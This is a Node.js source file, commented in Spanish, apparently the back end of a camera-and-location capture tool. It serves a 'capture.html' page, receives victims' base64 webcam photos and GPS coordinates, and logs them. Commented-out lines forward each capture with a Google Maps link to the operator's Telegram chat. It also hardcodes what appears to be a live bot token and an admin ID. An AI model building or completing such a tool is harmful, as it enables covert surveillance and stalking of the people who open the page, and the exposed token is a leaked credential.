const { Telegraf } = require('telegraf');
const http = require('http');
const fs = require('fs');

const BOT_TOKEN = '9087778104:AAEwlyzptGIwaArDnCdQcP-2yKAUREw8Vws'; 
const bot = new Telegraf(BOT_TOKEN);

// Tu ID de usuario para recibir las alertas (puedes obtenerlo buscando @userinfobot en Telegram)
// Si quieres que te llegue a TU chat personal, reemplaza ADMIN_ID con tu ID numérico.
// Si prefieres que llegue al CHAT donde está el bot, usa ctx.chat.id en lugar de esto.
const ADMIN_ID = '8396127605'; 

bot.start((ctx) => ctx.reply('Bot activo'));

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    if (req.url === '/' || req.url === '/capture.html') {
        fs.readFile('capture.html', (err, data) => {
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(data);
        });
    } 
    else if (req.url === '/send' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            const params = new URLSearchParams(body);
            const imageBase64 = params.get('image');
            const lat = params.get('lat');
            const lng = params.get('lng');

            if (imageBase64 && imageBase64 !== 'undefined') {
                try {
                    // Limpiar el base64 para enviarlo
                    const imgBuffer = Buffer.from(imageBase64.split(',')[1], 'base64');

                    // Enviar al admin (cambia ADMIN_ID por tu ID real si quieres recibirlo en DM)
                    // Si quieres que se envíe al chat del bot, usa: await bot.telegram.sendPhoto(ctx.state.chatId, ...)
                    
                    // Ejemplo: Enviar a tu chat personal si tienes el ID
                    // await bot.telegram.sendPhoto(ADMIN_ID, imgBuffer, { caption: `📍 Lat: ${lat}, Lng: ${lng}` });
                    
                    // O enviarlo al grupo/chat donde usaste /start:
                    // Como estamos en HTTP simple, necesitamos saber quién hizo click. 
                    // Para simplificar, lo enviaremos a un canal o grupo donde tengas el bot, 
                    // o simplemente loguearlo si no tienes un sistema de usuarios.
                    
                    console.log(`Foto recibida desde ${lat}, ${lng}`);
                    
                    // ENVÍO AUTOMÁTICO AL CHAT DEL BOT (si alguien escribió /start antes)
                    // Nota: Sin una base de datos, es difícil saber QUÉ usuario mandó la foto automáticamente 
                    // a menos que uses un Webhook. Pero podemos enviarla a un Canal de Anuncios:
                    
                    // REEMPLAZA ESTO CON EL ID DE UN CANAL O GRUPO SI QUIERES QUE TE LLEGUE DIRECTO
                    // await bot.telegram.sendPhoto('TU_CANAL_O_GRUPO', imgBuffer, {
                    //     caption: `📸 Nueva Captura\n📍 Ubicación: https://maps.google.com/?q=${lat},${lng}`
                    // });

                    res.writeHead(200);
                    res.end('OK');
                } catch (e) {
                    console.error(e);
                    res.writeHead(500);
                    res.end('Error');
                }
            }
        });
    }
});

server.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
